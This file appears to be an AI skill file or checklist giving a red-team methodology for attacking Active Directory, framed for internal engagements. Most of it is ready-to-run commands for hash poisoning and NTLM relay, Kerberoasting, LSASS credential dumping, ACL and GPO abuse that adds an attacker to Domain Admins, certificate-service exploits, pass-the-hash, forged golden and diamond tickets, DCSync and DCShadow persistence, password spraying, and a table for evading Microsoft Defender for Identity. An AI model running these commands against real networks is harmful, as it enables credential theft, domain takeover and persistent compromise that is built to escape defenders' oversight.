---
name: offensive-active-directory
description: Active Directory attack methodology for internal network red team engagements.
  Covers reconnaissance (BloodHound, PowerView, ADExplorer), credential abuse (Kerberoasting,
  ASREProasting, NTLM relay, LLMNR/NBT-NS poisoning), privilege escalation (ACL abuse,
  GPO abuse, unconstrained/constrained delegation), lateral movement (Pass-the-Hash,
  Pass-the-Ticket, Overpass-the-Hash, WMI/WinRM/PsExec), persistence (Golden/Silver/Diamond
  Tickets, DCSync, DCShadow, AdminSDHolder, Skeleton Key), forest trust attacks, ADCS
  abuse (ESC1-ESC15), and modern MDI/Defender for Identity evasion. Use when assessing
  on-prem AD, hybrid AD/Entra ID environments, or ADCS deployments.
---

# Active Directory — Offensive Testing Methodology

## Quick Workflow

1. Recon AD structure offline (BloodHound, ADExplorer snapshot) — minimize live queries
2. Harvest creds via poisoning, Kerberoasting, ASREProast, or LSASS where allowed
3. Map attack paths to Domain Admin / Enterprise Admin / Tier 0
4. Execute path with lowest detection cost, validate at each hop
5. Establish persistence and document every action with timestamps

---

## Reconnaissance

### BloodHound Collection

```powershell
# SharpHound (CSharp collector) — most stealthy with throttling
SharpHound.exe -c All,GPOLocalGroup --Throttle 1000 --Jitter 30 --ZipFileName recon.zip

# Stealth collection (DC-only, avoids workstation noise)
SharpHound.exe -c DCOnly --Stealth

# Bloodhound.py from Linux (no Windows host needed)
bloodhound-python -d corp.local -u user -p pass -ns 10.0.0.1 -c All
```

### PowerView (No Tool Drop)

```powershell
# Domain enumeration without binaries
$d = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
Get-DomainComputer -Unconstrained
Get-DomainGPO | ?{$_.gpcmachineextensionnames -match "Restricted Groups"}
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |
  ?{$_.ActiveDirectoryRights -match 'WriteDacl|GenericAll|WriteOwner'}
```

### ADExplorer Offline

```
# Take snapshot from any low-priv user, analyze offline
ADExplorer.exe → File → Create Snapshot
# Convert to BloodHound format
ADExplorerSnapshot.py snapshot.dat -o output/
```

---

## Credential Harvesting

### LLMNR / NBT-NS / mDNS Poisoning

```bash
# Capture NetNTLMv2 hashes from broadcast resolution
responder -I eth0 -wrf

# Inveigh (Windows-side, when you have a foothold)
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTP Y
```

Crack with hashcat mode 5600. If cracking fails, relay instead.

### NTLM Relay

```bash
# Identify relay targets (no SMB signing, LDAP signing not required)
nxc smb 10.0.0.0/24 --gen-relay-list relay-targets.txt

# Relay to LDAP/LDAPS for ACL abuse, ADCS for cert request
impacket-ntlmrelayx -tf relay-targets.txt -smb2support \
  --escalate-user attacker --delegate-access

# Relay to ADCS Web Enrollment (ESC8) — requires HTTP endpoint up
impacket-ntlmrelayx -t http://ca/certsrv/certfnsh.asp \
  --adcs --template DomainController
```

### Kerberoasting

```powershell
# Request TGS for all SPN-bearing accounts
Rubeus.exe kerberoast /outfile:tgs.txt /nowrap
# AES-only accounts (harder to crack but worth attempting)
Rubeus.exe kerberoast /aes /outfile:tgs_aes.txt
```

```bash
# Cross-platform from Linux
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.1 -request
hashcat -m 13100 tgs.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

### ASREProasting

```bash
# Find users with DONT_REQUIRE_PREAUTH set
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass
hashcat -m 18200 asrep.txt rockyou.txt
```

### LSASS / SAM Dumping

```cmd
:: Modern, AV-friendly: comsvcs.dll minidump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\out.dmp full

:: Task Manager → lsass.exe → Create dump file (GUI route, no binary drop)

:: nanodump (handle duplication, no MiniDumpWriteDump)
nanodump.exe --pid <PID> -w lsass.dmp --valid
```

Parse with Mimikatz or pypykatz offline:

```bash
pypykatz lsa minidump lsass.dmp
```

---

## Privilege Escalation Within AD

### ACL Abuse

| Right | Abuse |
|-------|-------|
| `GenericAll` / `GenericWrite` | Add SPN → Kerberoast; reset password; add member |
| `WriteDacl` | Grant yourself DCSync rights, then DCSync |
| `WriteOwner` | Take ownership → grant rights → exploit |
| `AllExtendedRights` (User) | Force password change |
| `AllExtendedRights` (Domain) | DCSync |
| `AddMember` | Add self to privileged group |
| `WriteSPN` | Set SPN, kerberoast target |

```powershell
# Targeted Kerberoast (write SPN, roast, remove SPN)
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/SPN'}
Rubeus.exe kerberoast /user:victim
Set-DomainObject -Identity victim -Clear serviceprincipalname

# Grant DCSync via WriteDacl
Add-DomainObjectAcl -TargetIdentity 'DC=corp,DC=local' \
  -PrincipalIdentity attacker -Rights DCSync
```

### Kerberos Delegation

```powershell
# Find delegation
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Unconstrained → wait for / coerce DC auth, capture TGT
Rubeus.exe monitor /interval:5 /nowrap

# Constrained (S4U2self/S4U2proxy) — impersonate any user to allowed SPN
Rubeus.exe s4u /user:svc_acct /rc4:<hash> /impersonateuser:Administrator \
  /msdsspn:cifs/dc.corp.local /ptt

# Resource-Based Constrained Delegation (RBCD) — write msDS-AllowedToActOnBehalfOfOtherIdentity
# Requires GenericAll/GenericWrite on the target computer object
```

### Coercion Primitives

| Technique | Tool / RPC |
|-----------|-----------|
| PetitPotam | `MS-EFSRPC` (`EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv`) |
| PrinterBug | `MS-RPRN` (`RpcRemoteFindFirstPrinterChangeNotificationEx`) |
| DFSCoerce | `MS-DFSNM` (`NetrDfsRemoveStdRoot`) |
| ShadowCoerce | `MS-FSRVP` |
| WebDAV | Search-and-replace UNC path embedded in any web fetch |

```bash
# Coerce + relay full chain
impacket-ntlmrelayx -t ldap://dc -smb2support --delegate-access &
PetitPotam.py -u low -p pass attacker-ip dc-ip
# Result: RBCD set, S4U → DA on coerced machine
```

### GPO Abuse

```powershell
# Find GPOs you can edit
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs |
  ?{ $_.SecurityIdentifier -eq (Get-DomainUser current).objectsid `
     -and $_.ActiveDirectoryRights -match 'WriteProperty|WriteDacl' }

# SharpGPOAbuse — add scheduled task / immediate task to GPO
SharpGPOAbuse.exe --AddComputerTask --TaskName Update --Author NT\System \
  --Command cmd.exe --Arguments "/c net group 'Domain Admins' attacker /add /domain" \
  --GPOName "Workstation Policy"
```

---

## ADCS Abuse — ESC1 through ESC15

### Enumeration

```bash
certipy find -u user@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable -stdout
```

### Common Misconfigurations

| ID | Misconfig | Exploitation |
|----|-----------|--------------|
| ESC1 | Client Auth + ENROLLEE_SUPPLIES_SUBJECT | Request cert with arbitrary UPN |
| ESC2 | Any Purpose EKU | Request cert valid for any use |
| ESC3 | Enrollment Agent | Request agent cert, then on-behalf-of any user |
| ESC4 | Vulnerable template ACL | Modify template to ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | SAN injection on any template |
| ESC7 | Vulnerable CA ACL (ManageCA) | Approve own pending requests |
| ESC8 | Web Enrollment HTTP + no EPA | NTLM relay → cert |
| ESC9 | No security extension + UPN | UPN spoofing post-account-rename |
| ESC10 | StrongCertificateBindingEnforcement weak | UPN spoofing without rename |
| ESC11 | RPC unprotected (no ICertPassage IF_ENFORCEENCRYPTICERTREQUEST) | Relay over RPC |
| ESC13 | Issuance policy linked to group | Cert grants group membership |
| ESC14 | altSecurityIdentities write | Map attacker cert to admin |
| ESC15 | EKUwu — schema v1 templates | Inject EKU at request time |

### ESC1 Exploitation

```bash
# Request cert as Administrator
certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate \
  -upn administrator@corp.local

# Use cert to get TGT and NT hash via UnPAC-the-Hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC8 (Web Enrollment Relay)

```bash
# Coerce any DC, relay to ADCS Web Enrollment, request DC cert
impacket-ntlmrelayx -t http://ca/certsrv/certfnsh.asp \
  --adcs --template DomainController &
PetitPotam.py attacker-ip dc.corp.local
# Result: cert for DC$ → TGT → DCSync
```

---

## Lateral Movement

### Pass-the-Hash / Overpass-the-Hash

```bash
# PTH with NT hash
nxc smb 10.0.0.0/24 -u admin -H <NThash> --local-auth
impacket-psexec corp/admin@target -hashes :<NThash>

# Overpass-the-Hash (NT hash → TGT, useful for Kerberos-only targets)
Rubeus.exe asktgt /user:admin /rc4:<NThash> /ptt
```

### Pass-the-Ticket

```powershell
# Inject TGT
Rubeus.exe ptt /ticket:base64.kirbi
# Or from .ccache
KRB5CCNAME=admin.ccache impacket-secretsdump -k -no-pass dc.corp.local
```

### Silent Lateral Tools

```bash
# WinRM (no event logs in default channel for command exec)
evil-winrm -i target -u admin -H <hash>

# SMB exec without service creation (uses task scheduler)
impacket-atexec corp/admin@target -hashes :<hash> "whoami"

# WMI
impacket-wmiexec corp/admin@target -hashes :<hash>

# DCOM (MMC20.Application, ShellWindows, ShellBrowserWindow)
Invoke-DCOM -ComputerName target -Method MMC20 -Command "calc.exe"
```

---

## Persistence

### Golden Ticket (krbtgt forge)

```bash
# Requires krbtgt NT hash (from DCSync)
impacket-ticketer -nthash <krbtgt-NT> -domain-sid S-1-5-21-... -domain corp.local Administrator
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass dc.corp.local
```

### Silver Ticket (per-service forge)

```bash
# Forge TGS for a specific service using its account hash
impacket-ticketer -nthash <svc-NT> -domain-sid <SID> -domain corp.local \
  -spn cifs/server.corp.local Administrator
```

### Diamond / Sapphire Ticket (modern, evades MDI on krbtgt)

```bash
# Diamond — modify legitimate TGT in-flight (no krbtgt hash on wire)
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512
```

### DCSync

```bash
impacket-secretsdump -just-dc-user 'corp/krbtgt' corp/admin@dc -hashes :<hash>
# In-memory PowerShell variant (Mimikatz)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'
```

### DCShadow (register rogue DC, push changes)

```
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:CN=victim,... /attribute:primaryGroupID /value:519
mimikatz # lsadump::dcshadow /push
```

### AdminSDHolder

Add ACE granting your account `GenericAll` on `CN=AdminSDHolder,CN=System,DC=corp,DC=local`. SDProp propagates to all protected groups every 60 minutes.

---

## Forest & Trust Attacks

```powershell
# Map trusts
Get-DomainTrust -SearchBase "DC=corp,DC=local"
Get-ForestTrust

# SID History injection (cross-forest if SID filtering disabled)
# ExtraSids in golden ticket → admin in trusted forest
impacket-ticketer -nthash <krbtgt> -domain-sid <child-SID> \
  -extra-sid S-1-5-21-<parent>-519 -domain child.corp.local Administrator

# Trust ticket forging (inter-realm TGT)
Rubeus.exe asktgs /service:krbtgt/parent.local /ticket:trust-ticket.kirbi
```

---

## Hybrid AD / Entra ID (Azure AD) Pivots

| Pivot | Path |
|-------|------|
| AAD Connect server compromise | Dump MSOL_ account → DCSync on-prem |
| Seamless SSO | Forge Kerberos ticket for `AZUREADSSOACC$` → cloud SSO any user |
| PTA agent | DLL hijack `Microsoft.Azure.SecurityTokenService` → harvest cleartext |
| PHS hash sync | Read on-prem hashes from AAD Connect SQL (ADSync DB) |
| Federated trust | Forge SAML token via stolen ADFS token-signing cert (Golden SAML) |
| Pass-the-PRT | Steal PRT cookie from device → cloud session as user |

```powershell
# AADInternals — Hybrid identity attack toolkit
Get-AADIntADSyncCredentials  # Extract MSOL_ creds from AAD Connect
Open-AADIntOffice365Portal -AccessToken $token
New-AADIntSAMLToken -ImmutableID 'a==' -Issuer 'http://sts/adfs/services/trust' \
  -PfxFileName 'token-signing.pfx'
```

---

## Detection Evasion (MDI / Defender for Identity)

| MDI Detector | Evasion |
|--------------|---------|
| Honeytoken account access | Always check `description` and recent activity before hitting accounts |
| Reconnaissance via SAMR | Use ADWS / LDAP-only collection, throttle |
| Suspicious Kerberos delegation | Avoid noisy `S4U2self` chains on monitored DCs |
| Golden/Silver Ticket detection | Use Diamond/Sapphire variants; match legitimate ticket lifetime/encryption |
| DCSync from non-DC | Relay through legitimate replication-permitted accounts |
| Pass-the-Hash | Use overpass-the-hash to convert to Kerberos before lateraling |

```powershell
# Identify MDI sensors before noisy actions
Get-DomainComputer -SPN '*MicrosoftATA*'
Get-DomainComputer | ?{ $_.servicePrincipalName -match 'AATPSensor' }
```

---

## Engagement Cheatsheet

```bash
# 1. Anonymous LDAP enum (no creds)
ldapsearch -x -H ldap://dc -s base -b "" "(objectclass=*)"
nxc ldap dc -u '' -p '' --users

# 2. Null SMB session
nxc smb dc -u '' -p '' --shares
impacket-rpcclient -U '' dc -no-pass

# 3. Password spray (low and slow)
nxc smb dc -u users.txt -p 'Winter2025!' --continue-on-success

# 4. Once authed: full enum + BloodHound
bloodhound-python -d corp.local -u user -p pass -ns dc -c All --zip

# 5. Identify attack path → execute → loot → persist
```

---

## Key References

- MITRE ATT&CK: TA0006 (Credential Access), TA0008 (Lateral Movement), T1558 (Steal/Forge Kerberos)
- ADCS: SpecterOps "Certified Pre-Owned" (Schroeder, Christensen)
- BloodHound: bloodhound.specterops.io
- Coercion: github.com/p0dalirius/Coercer (unified coercion toolkit)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/active-directory.md
